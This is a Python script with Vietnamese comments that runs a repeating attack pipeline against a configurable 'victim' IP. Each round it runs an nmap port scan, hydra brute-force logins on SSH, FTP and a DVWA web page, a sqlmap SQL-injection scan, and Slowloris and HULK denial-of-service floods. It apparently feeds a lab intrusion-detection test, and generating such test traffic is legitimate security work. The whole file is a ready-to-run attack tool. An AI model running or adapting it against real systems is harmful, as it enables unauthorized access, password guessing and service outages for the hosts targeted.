import subprocess
import time
import os

# CẤU HÌNH ĐỊA CHỈ IP CỦA LAPTOP 2 (MÁY NẠN NHÂN)
VICTIM_IP = "192.168.x.x"  # TODO: Đổi thành IP WiFi thực tế của Laptop 2

def run_command(command, description):
    print(f"\n{'='*50}")
    print(f"[ATTACK] Đang bắt đầu: {description}")
    print(f"Lệnh: {command}")
    print(f"{'='*50}")
    try:
        # Chạy lệnh hệ thống
        process = subprocess.Popen(command, shell=True)
        # Đợi lệnh chạy xong
        process.wait()
    except KeyboardInterrupt:
        print("\n[!] Dừng cuộc tấn công.")
        process.terminate()

def attack_pipeline():
    print("\n[ATTACK] Kích hoạt chế độ Tấn công Liên tục (Live Detection Mode)")
    round_num = 1
    while True:
        print(f"\n{'='*50}")
        print(f"--- ĐỢT TẤN CÔNG {round_num} ---")
        print(f"{'='*50}")

        # 1. PortScan
        run_command(f"sudo nmap -sT -T4 -p 1-1000 {VICTIM_IP}", "PortScan")
        time.sleep(10)

        # 2. SSH Brute Force
        run_command(
            f"timeout 30s hydra -l root -P /usr/share/wordlists/rockyou.txt "
            f"ssh://{VICTIM_IP} -t 4 -f",
            "SSH Brute Force"
        )
        time.sleep(10)

        # 3. FTP Brute Force
        run_command(
            f"timeout 30s hydra -l admin -P /usr/share/wordlists/rockyou.txt "
            f"ftp://{VICTIM_IP} -t 4 -f",
            "FTP Brute Force"
        )
        time.sleep(10)

        # 4. Web Brute Force (giữ nguyên)
        run_command(
            f"timeout 30s hydra -l admin -P /usr/share/wordlists/rockyou.txt "
            f"{VICTIM_IP} http-get /DVWA/login.php",
            "Web Brute Force"
        )
        time.sleep(10)

        # 5. SQL Injection
        run_command(
            f"sqlmap -u 'http://{VICTIM_IP}/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit' "
            f"--cookie='security=low' --batch --dbs --level=1 --risk=1",
            "SQL Injection Scan"
        )
        time.sleep(10)

        # 6. DoS Slowloris (giữ nguyên)
        run_command(
            f"timeout 30s slowloris {VICTIM_IP} -p 80 -s 200",
            "DoS Slowloris"
        )
        time.sleep(10)

        # 7. DoS Hulk (cần clone script trước)
        if os.path.exists("/opt/hulk/hulk.py"):
            run_command(
                f"timeout 30s python3 /opt/hulk/hulk.py http://{VICTIM_IP}",
                "DoS Hulk"
            )
            time.sleep(10)

        print(f"\n--- XONG ĐỢT {round_num}. NGHỈ 20 GIÂY ĐỂ GUI LÀM DỊU... ---")
        time.sleep(20)
        round_num += 1

if __name__ == "__main__":
    if "192.168.x.x" in VICTIM_IP:
        print("[LỖI] Vui lòng chỉnh sửa biến VICTIM_IP thành IP thật của Máy Nạn Nhân.")
        exit(1)
        
    print(f"=== BẮT ĐẦU KỊCH BẢN TẤN CÔNG VÀO {VICTIM_IP} ===")
    attack_pipeline()

